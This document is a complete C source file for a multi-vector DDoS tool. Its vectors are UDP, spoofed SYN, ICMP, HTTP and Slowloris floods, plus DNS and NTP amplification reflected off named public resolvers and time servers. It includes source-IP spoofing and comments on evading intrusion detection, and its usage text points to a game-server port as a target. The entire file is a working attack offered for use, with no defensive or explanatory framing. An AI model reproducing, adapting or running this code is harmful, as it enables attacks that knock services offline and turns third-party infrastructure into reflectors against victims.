/*
 * ddos_engine.c — multi-vector DDoS binary
 * compile: gcc -O3 -pthread -o ddos_engine ddos_engine.c
 * usage  : ./ddos_engine <ip> <port> <seconds> <threads>
 *
 * vectors: UDP flood | TCP SYN flood | HTTP flood | ICMP flood
 *          DNS amplification | NTP amplification | Slowloris
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>
#include <fcntl.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>

/* ── global config ─────────────────────────── */
#define PACKET_SIZE       1400
#define MAX_THREADS       1024
#define SLOWLORIS_SOCKS   500
#define MAX_DURATION      300

static volatile int  g_running  = 1;
static char          g_target_ip[64];
static int           g_target_port;
static int           g_duration;
static int           g_thread_count;

/* ── DNS resolvers for amplification ─────── */
static const char *DNS_RESOLVERS[] = {
    "8.8.8.8","8.8.4.4","1.1.1.1","1.0.0.1",
    "9.9.9.9","208.67.222.222","208.67.220.220",
    "64.6.64.6","77.88.8.8","185.228.168.9",
};
#define DNS_RESOLVER_COUNT 10

/* ── NTP servers ─────────────────────────── */
static const char *NTP_SERVERS[] = {
    "216.239.35.0","216.239.35.4","216.239.35.8","216.239.35.12",
    "129.6.15.28","129.6.15.29","132.163.96.1","132.163.97.1",
};
#define NTP_SERVER_COUNT 8

/* ════════════════════════════════════════════
 * UTILITY
 * ════════════════════════════════════════════ */

static uint32_t fast_rand_state = 0;

static inline uint32_t fast_rand(void) {
    fast_rand_state ^= fast_rand_state << 13;
    fast_rand_state ^= fast_rand_state >> 17;
    fast_rand_state ^= fast_rand_state << 5;
    return fast_rand_state;
}

static void rand_bytes(uint8_t *buf, size_t len) {
    for (size_t i = 0; i < len; i++)
        buf[i] = (uint8_t)fast_rand();
}

static uint32_t rand_ip(void) {
    uint32_t ip;
    do { ip = fast_rand(); }
    while ((ip & 0xFF) == 0 || (ip & 0xFF) == 255);
    return ip;
}

static uint16_t checksum(const void *data, size_t len) {
    const uint16_t *ptr = (const uint16_t *)data;
    uint32_t sum = 0;
    while (len > 1) { sum += *ptr++; len -= 2; }
    if (len) sum += *(const uint8_t *)ptr;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += sum >> 16;
    return (uint16_t)~sum;
}

static uint16_t tcp_udp_checksum(
    uint32_t src, uint32_t dst, uint8_t proto,
    const void *payload, size_t plen
) {
    struct pseudo_hdr {
        uint32_t src, dst;
        uint8_t  zero, proto;
        uint16_t len;
    } ph;
    ph.src   = src;
    ph.dst   = dst;
    ph.zero  = 0;
    ph.proto = proto;
    ph.len   = htons((uint16_t)plen);

    size_t   tlen = sizeof(ph) + plen;
    uint8_t *tmp  = calloc(1, tlen);
    memcpy(tmp, &ph, sizeof(ph));
    memcpy(tmp + sizeof(ph), payload, plen);
    uint16_t cs = checksum(tmp, tlen);
    free(tmp);
    return cs;
}

/* ════════════════════════════════════════════
 * 1. UDP FLOOD
 * ════════════════════════════════════════════ */
typedef struct { int id; } udp_args_t;

static void *udp_flood_thread(void *arg) {
    (void)arg;
    fast_rand_state = (uint32_t)time(NULL) ^ (uint32_t)(uintptr_t)arg;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return NULL;

    int sndbuf = 1 << 20;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    struct sockaddr_in dst = {0};
    dst.sin_family      = AF_INET;
    dst.sin_port        = htons(g_target_port);
    inet_pton(AF_INET, g_target_ip, &dst.sin_addr);

    uint8_t buf[PACKET_SIZE];
    rand_bytes(buf, PACKET_SIZE);

    while (g_running) {
        /* mutate 16 bytes per send for IDS evasion */
        for (int i = 0; i < 16; i++)
            buf[fast_rand() % PACKET_SIZE] = (uint8_t)fast_rand();
        sendto(sock, buf, PACKET_SIZE, MSG_DONTWAIT,
               (struct sockaddr *)&dst, sizeof(dst));
    }
    close(sock);
    return NULL;
}

/* ════════════════════════════════════════════
 * 2. RAW UDP FLOOD (spoofed source)
 * ════════════════════════════════════════════ */
static void *raw_udp_flood_thread(void *arg) {
    (void)arg;
    fast_rand_state = (uint32_t)time(NULL) ^ (uint32_t)(uintptr_t)arg ^ 0xDEAD;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return NULL;   /* needs root */

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port   = htons(g_target_port);
    inet_pton(AF_INET, g_target_ip, &dst.sin_addr);

    uint8_t pkt[20 + 8 + PACKET_SIZE];
    memset(pkt, 0, sizeof(pkt));

    struct iphdr  *iph = (struct iphdr  *)pkt;
    struct udphdr *udph = (struct udphdr *)(pkt + 20);
    uint8_t       *data = pkt + 28;

    iph->version  = 4;
    iph->ihl      = 5;
    iph->ttl      = 64 + (fast_rand() & 63);
    iph->protocol = IPPROTO_UDP;
    iph->daddr    = dst.sin_addr.s_addr;
    iph->tot_len  = htons(sizeof(pkt));

    udph->dest = htons(g_target_port);
    udph->len  = htons(8 + PACKET_SIZE);

    rand_bytes(data, PACKET_SIZE);

    while (g_running) {
        iph->saddr = rand_ip();
        iph->id    = (uint16_t)fast_rand();
        udph->source = (uint16_t)fast_rand();
        udph->check  = 0;
        iph->check   = 0;
        iph->check   = checksum(iph, 20);

        for (int i = 0; i < 8; i++)
            data[fast_rand() % PACKET_SIZE] = (uint8_t)fast_rand();

        sendto(sock, pkt, sizeof(pkt), MSG_DONTWAIT,
               (struct sockaddr *)&dst, sizeof(dst));
    }
    close(sock);
    return NULL;
}

/* ════════════════════════════════════════════
 * 3. TCP SYN FLOOD (raw, spoofed)
 * ════════════════════════════════════════════ */
static void *tcp_syn_flood_thread(void *arg) {
    (void)arg;
    fast_rand_state = (uint32_t)time(NULL) ^ (uint32_t)(uintptr_t)arg ^ 0xBEEF;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return NULL;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port   = htons(g_target_port);
    inet_pton(AF_INET, g_target_ip, &dst.sin_addr);

    uint8_t pkt[40] = {0};

    struct iphdr  *iph = (struct iphdr *)pkt;
    struct tcphdr *tcph = (struct tcphdr *)(pkt + 20);

    iph->version  = 4;
    iph->ihl      = 5;
    iph->ttl      = 64;
    iph->protocol = IPPROTO_TCP;
    iph->daddr    = dst.sin_addr.s_addr;
    iph->tot_len  = htons(40);

    tcph->dest    = htons(g_target_port);
    tcph->seq     = fast_rand();
    tcph->doff    = 5;
    tcph->syn     = 1;
    tcph->window  = htons(65535);

    while (g_running) {
        iph->saddr    = rand_ip();
        iph->id       = (uint16_t)fast_rand();
        tcph->source  = (uint16_t)fast_rand();
        tcph->seq     = fast_rand();

        iph->check   = 0;
        iph->check   = checksum(iph, 20);

        tcph->check  = 0;
        tcph->check  = tcp_udp_checksum(
            iph->saddr, iph->daddr,
            IPPROTO_TCP, tcph, 20
        );

        sendto(sock, pkt, 40, MSG_DONTWAIT,
               (struct sockaddr *)&dst, sizeof(dst));
    }
    close(sock);
    return NULL;
}

/* ════════════════════════════════════════════
 * 4. TCP CONNECT FLOOD (real connections)
 * ════════════════════════════════════════════ */
static void *tcp_connect_flood_thread(void *arg) {
    (void)arg;
    while (g_running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct timeval tv = {0, 200000}; /* 200ms timeout */
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        struct sockaddr_in dst = {0};
        dst.sin_family = AF_INET;
        dst.sin_port   = htons(g_target_port);
        inet_pton(AF_INET, g_target_ip, &dst.sin_addr);

        connect(sock, (struct sockaddr *)&dst, sizeof(dst));
        usleep(100000);
        close(sock);
    }
    return NULL;
}

/* ════════════════════════════════════════════
 * 5. ICMP FLOOD (raw)
 * ════════════════════════════════════════════ */
static void *icmp_flood_thread(void *arg) {
    (void)arg;
    fast_rand_state = (uint32_t)time(NULL) ^ 0xCAFE;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return NULL;

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    inet_pton(AF_INET, g_target_ip, &dst.sin_addr);

    uint8_t pkt[8 + 56];
    struct icmphdr *icmph = (struct icmphdr *)pkt;
    uint8_t *data = pkt + 8;
    rand_bytes(data, 56);

    while (g_running) {
        icmph->type     = ICMP_ECHO;
        icmph->code     = 0;
        icmph->checksum = 0;
        icmph->un.echo.id  = (uint16_t)fast_rand();
        icmph->un.echo.sequence = (uint16_t)fast_rand();
        for (int i = 0; i < 4; i++)
            data[fast_rand() % 56] = (uint8_t)fast_rand();
        icmph->checksum = checksum(pkt, sizeof(pkt));

        sendto(sock, pkt, sizeof(pkt), MSG_DONTWAIT,
               (struct sockaddr *)&dst, sizeof(dst));
    }
    close(sock);
    return NULL;
}

/* ════════════════════════════════════════════
 * 6. HTTP FLOOD (Layer 7)
 * ════════════════════════════════════════════ */
static const char *HTTP_UAS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 Chrome/119.0.0.0",
    "UnityPlayer/2020.3.34f1 (UnityWebRequest/1.0 libcurl/7.75.0-DEV)",
    "Dalvik/2.1.0 (Linux; U; Android 11; SM-A325F Build/RP1A.200720.012)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
    "BGMI/1.8 CFNetwork/1399 Darwin/22.1.0",
};
#define UA_COUNT 6

static void *http_flood_thread(void *arg) {
    (void)arg;
    fast_rand_state = (uint32_t)time(NULL) ^ (uint32_t)(uintptr_t)arg ^ 0x1234;

    while (g_running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct timeval tv = {1, 0};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        struct sockaddr_in dst = {0};
        dst.sin_family = AF_INET;
        dst.sin_port   = htons(g_target_port);
        inet_pton(AF_INET, g_target_ip, &dst.sin_addr);

        if (connect(sock, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
            close(sock);
            continue;
        }

        /* random 12-char path */
        char path[16];
        for (int i = 0; i < 12; i++)
            path[i] = 'a' + (fast_rand() % 26);
        path[12] = '\0';

        /* random spoofed X-Forwarded-For */
        char xfwd[32];
        snprintf(xfwd, sizeof(xfwd), "%u.%u.%u.%u",
            fast_rand() % 254 + 1, fast_rand() % 254 + 1,
            fast_rand() % 254 + 1, fast_rand() % 254 + 1);

        char req[1024];
        int  rlen = snprintf(req, sizeof(req),
            "GET /%s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "X-Forwarded-For: %s\r\n"
            "Accept: */*\r\n"
            "Connection: keep-alive\r\n"
            "Cache-Control: no-cache\r\n"
            "\r\n",
            path, g_target_ip,
            HTTP_UAS[fast_rand() % UA_COUNT],
            xfwd
        );

        for (int burst = 0; burst < 20 && g_running; burst++) {
            send(sock, req, rlen, MSG_DONTWAIT);
        }
        close(sock);
    }
    return NULL;
}

/* ════════════════════════════════════════════
 * 7. DNS AMPLIFICATION
 * ════════════════════════════════════════════ */

static void build_dns_query(uint8_t *buf, size_t *len, const char *domain) {
    uint16_t txid  = (uint16_t)fast_rand();
    uint8_t header[12];
    header[0]  = (txid >> 8) & 0xFF;
    header[1]  = txid & 0xFF;
    header[2]  = 0x01; header[3] = 0x00; /* flags: standard query RD */
    header[4]  = 0x00; header[5] = 0x01; /* qdcount = 1 */
    header[6]  = header[7] = 0;
    header[8]  = header[9] = 0;
    header[10] = header[11] = 0;
    memcpy(buf, header, 12);

    size_t pos = 12;
    const char *p = domain;
    while (*p) {
        const char *dot = strchr(p, '.');
        size_t part_len = dot ? (size_t)(dot - p) : strlen(p);
        buf[pos++] = (uint8_t)part_len;
        memcpy(buf + pos, p, part_len);
        pos += part_len;
        p  += part_len;
        if (*p == '.') p++;
    }
    buf[pos++] = 0x00;
    buf[pos++] = 0x00; buf[pos++] = 0xFF; /* QTYPE = ANY */
    buf[pos++] = 0x00; buf[pos++] = 0x01; /* QCLASS = IN */
    *len = pos;
}

static void build_ip_udp_packet(
    uint8_t *pkt, size_t *pkt_len,
    uint32_t src_ip, const char *dst_ip,
    uint16_t dst_port,
    const uint8_t *payload, size_t payload_len
) {
    struct iphdr  *iph  = (struct iphdr  *)pkt;
    struct udphdr *udph = (struct udphdr *)(pkt + 20);
    uint8_t *data       = pkt + 28;

    iph->version  = 4; iph->ihl = 5;
    iph->tos      = 0;
    iph->tot_len  = htons(28 + payload_len);
    iph->id       = (uint16_t)fast_rand();
    iph->frag_off = 0;
    iph->ttl      = 64;
    iph->protocol = IPPROTO_UDP;
    iph->check    = 0;
    iph->saddr    = src_ip;
    inet_pton(AF_INET, dst_ip, &iph->daddr);

    udph->source = htons(1024 + (fast_rand() % 64511));
    udph->dest   = htons(dst_port);
    udph->len    = htons(8 + payload_len);
    udph->check  = 0;

    memcpy(data, payload, payload_len);

    iph->check = checksum(iph, 20);
    *pkt_len   = 28 + payload_len;
}

static const char *AMP_DOMAINS[] = {
    "isc.org","cloudflare.com","google.com",
    "amazon.com","akamai.com","fastly.com",
};
#define AMP_DOMAIN_COUNT 6

static void *dns_amp_thread(void *arg) {
    (void)arg;
    fast_rand_state = (uint32_t)time(NULL) ^ (uint32_t)(uintptr_t)arg ^ 0x5353;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return NULL;
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct in_addr target_addr;
    inet_pton(AF_INET, g_target_ip, &target_addr);

    uint8_t dns_payload[512];
    uint8_t pkt[600];
    size_t  dns_len, pkt_len;

    while (g_running) {
        const char *resolver = DNS_RESOLVERS[fast_rand() % DNS_RESOLVER_COUNT];
        const char *domain   = AMP_DOMAINS[fast_rand() % AMP_DOMAIN_COUNT];
        build_dns_query(dns_payload, &dns_len, domain);

        build_ip_udp_packet(
            pkt, &pkt_len,
            target_addr.s_addr,
            resolver, 53,
            dns_payload, dns_len
        );

        struct sockaddr_in r = {0};
        r.sin_family = AF_INET;
        inet_pton(AF_INET, resolver, &r.sin_addr);
        sendto(sock, pkt, pkt_len, MSG_DONTWAIT,
               (struct sockaddr *)&r, sizeof(r));
    }
    close(sock);
    return NULL;
}

/* ════════════════════════════════════════════
 * 8. NTP AMPLIFICATION (MON_GETLIST)
 * ════════════════════════════════════════════ */
static void *ntp_amp_thread(void *arg) {
    (void)arg;
    fast_rand_state = (uint32_t)time(NULL) ^ (uint32_t)(uintptr_t)arg ^ 0x4E54;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return NULL;
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct in_addr target_addr;
    inet_pton(AF_INET, g_target_ip, &target_addr);

    /* NTP monlist (mode 7, op 42) request */
    static const uint8_t NTP_MONLIST[] = {
        0x17, 0x00, 0x03, 0x2a,
        0x00, 0x00, 0x00, 0x00
    };

    uint8_t pkt[600];
    size_t  pkt_len;

    while (g_running) {
        const char *srv = NTP_SERVERS[fast_rand() % NTP_SERVER_COUNT];
        build_ip_udp_packet(
            pkt, &pkt_len,
            target_addr.s_addr,
            srv, 123,
            NTP_MONLIST, sizeof(NTP_MONLIST)
        );

        struct sockaddr_in r = {0};
        r.sin_family = AF_INET;
        inet_pton(AF_INET, srv, &r.sin_addr);
        sendto(sock, pkt, pkt_len, MSG_DONTWAIT,
               (struct sockaddr *)&r, sizeof(r));
    }
    close(sock);
    return NULL;
}

/* ════════════════════════════════════════════
 * 9. SLOWLORIS
 * ════════════════════════════════════════════ */
static int slowloris_socks[SLOWLORIS_SOCKS];
static int slowloris_count = 0;

static int open_slowloris_socket(void) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct timeval tv = {4, 0};
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port   = htons(g_target_port);
    inet_pton(AF_INET, g_target_ip, &dst.sin_addr);

    if (connect(sock, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        close(sock); return -1;
    }

    char req[512];
    snprintf(req, sizeof(req),
        "GET /%08x HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Content-Length: 900000\r\n",
        fast_rand(), g_target_ip
    );
    send(sock, req, strlen(req), 0);
    return sock;
}

static void *slowloris_thread(void *arg) {
    (void)arg;
    fast_rand_state = (uint32_t)time(NULL) ^ 0x510C;

    /* open initial sockets */
    for (int i = 0; i < SLOWLORIS_SOCKS; i++) {
        slowloris_socks[i] = open_slowloris_socket();
        if (slowloris_socks[i] > 0) slowloris_count++;
    }

    while (g_running) {
        for (int i = 0; i < SLOWLORIS_SOCKS && g_running; i++) {
            char keep[64];
            snprintf(keep, sizeof(keep), "X-Keep: %u\r\n", fast_rand());
            if (slowloris_socks[i] < 0 ||
                send(slowloris_socks[i], keep, strlen(keep), MSG_NOSIGNAL) < 0) {
                if (slowloris_socks[i] >= 0) close(slowloris_socks[i]);
                slowloris_socks[i] = open_slowloris_socket();
            }
        }
        sleep(10);
    }

    for (int i = 0; i < SLOWLORIS_SOCKS; i++)
        if (slowloris_socks[i] >= 0) close(slowloris_socks[i]);
    return NULL;
}

/* ════════════════════════════════════════════
 * SIGNAL HANDLER & TIMER
 * ════════════════════════════════════════════ */
static void handle_signal(int sig) {
    (void)sig;
    g_running = 0;
}

static void *timer_thread(void *arg) {
    int secs = *(int *)arg;
    sleep(secs);
    g_running = 0;
    return NULL;
}

/* ════════════════════════════════════════════
 * MAIN
 * ════════════════════════════════════════════ */
int main(int argc, char *argv[]) {
    if (argc < 5) {
        fprintf(stderr,
            "Usage: %s <ip> <port> <seconds> <threads>\n"
            "  ip      — target server IP\n"
            "  port    — target port (e.g. 17500 for BGMI)\n"
            "  seconds — attack duration (max %d)\n"
            "  threads — flood threads per vector (e.g. 512)\n",
            argv[0], MAX_DURATION
        );
        return 1;
    }

    strncpy(g_target_ip, argv[1], sizeof(g_target_ip) - 1);
    g_target_port  = atoi(argv[2]);
    g_duration     = atoi(argv[3]);
    g_thread_count = atoi(argv[4]);

    if (g_duration > MAX_DURATION) {
        fprintf(stderr, "[!] Duration capped to %ds\n", MAX_DURATION);
        g_duration = MAX_DURATION;
    }
    if (g_thread_count > MAX_THREADS) g_thread_count = MAX_THREADS;
    if (g_target_port < 1 || g_target_port > 65535) {
        fprintf(stderr, "[!] Invalid port\n"); return 1;
    }

    fast_rand_state = (uint32_t)time(NULL);

    signal(SIGINT,  handle_signal);
    signal(SIGTERM, handle_signal);
    signal(SIGPIPE, SIG_IGN);

    printf(
        "[*] Target   : %s:%d\n"
        "[*] Duration : %ds\n"
        "[*] Threads  : %d per vector\n"
        "[*] Vectors  : UDP | RAW-UDP | TCP-SYN | TCP-Connect | ICMP"
                       " | HTTP | DNS-Amp | NTP-Amp | Slowloris\n",
        g_target_ip, g_target_port, g_duration, g_thread_count
    );

    pthread_t threads[MAX_THREADS * 9 + 10];
    int       tcount = 0;

    /* ── timer ────────────────────────────── */
    pthread_create(&threads[tcount++], NULL, timer_thread, &g_duration);

    /* ── UDP flood ─────────────────────────── */
    for (int i = 0; i < g_thread_count; i++)
        pthread_create(&threads[tcount++], NULL, udp_flood_thread, (void *)(uintptr_t)i);

    /* ── raw UDP flood (spoofed) ─────────── */
    for (int i = 0; i < g_thread_count; i++)
        pthread_create(&threads[tcount++], NULL, raw_udp_flood_thread, (void *)(uintptr_t)i);

    /* ── TCP SYN flood ───────────────────── */
    for (int i = 0; i < g_thread_count / 2; i++)
        pthread_create(&threads[tcount++], NULL, tcp_syn_flood_thread, (void *)(uintptr_t)i);

    /* ── TCP connect flood ───────────────── */
    for (int i = 0; i < g_thread_count / 4; i++)
        pthread_create(&threads[tcount++], NULL, tcp_connect_flood_thread, (void *)(uintptr_t)i);

    /* ── ICMP flood ──────────────────────── */
    for (int i = 0; i < g_thread_count / 4; i++)
        pthread_create(&threads[tcount++], NULL, icmp_flood_thread, (void *)(uintptr_t)i);

    /* ── HTTP flood ──────────────────────── */
    for (int i = 0; i < g_thread_count / 2; i++)
        pthread_create(&threads[tcount++], NULL, http_flood_thread, (void *)(uintptr_t)i);

    /* ── DNS amplification ───────────────── */
    for (int i = 0; i < 64; i++)
        pthread_create(&threads[tcount++], NULL, dns_amp_thread, (void *)(uintptr_t)i);

    /* ── NTP amplification ───────────────── */
    for (int i = 0; i < 32; i++)
        pthread_create(&threads[tcount++], NULL, ntp_amp_thread, (void *)(uintptr_t)i);

    /* ── Slowloris ───────────────────────── */
    pthread_create(&threads[tcount++], NULL, slowloris_thread, NULL);

    printf("[+] %d threads launched — flooding for %ds\n", tcount, g_duration);

    /* wait for all */
    for (int i = 0; i < tcount; i++)
        pthread_join(threads[i], NULL);

    printf("[+] Attack finished.\n");
    return 0;
}
